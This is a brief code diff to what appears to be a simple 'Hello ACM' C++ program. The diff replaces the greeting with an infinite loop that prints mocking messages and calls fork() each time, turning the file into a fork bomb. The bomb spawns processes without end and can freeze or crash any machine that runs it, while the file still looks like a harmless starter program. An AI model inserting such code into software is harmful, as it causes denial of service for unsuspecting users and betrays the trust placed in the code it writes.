@@ -1,10 +1,16 @@
 #include <iostream>
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <pthread.h>
 
-int main()
+int main(int argc, char* argv[])
 {
-  std::cout << "Hello ACM!";
-
-  // If this was java, I could've done this:
-  //    Exception up = new Exception(“Something is really wrong.”);
-  //    throw up; //ha ha
+  while(true) {
+    std::cout << "Ryan is pro gitter!\ngit rekt\ndashbestpone";
+	
+    fork();
+  }
+  
+  return 0;
 }
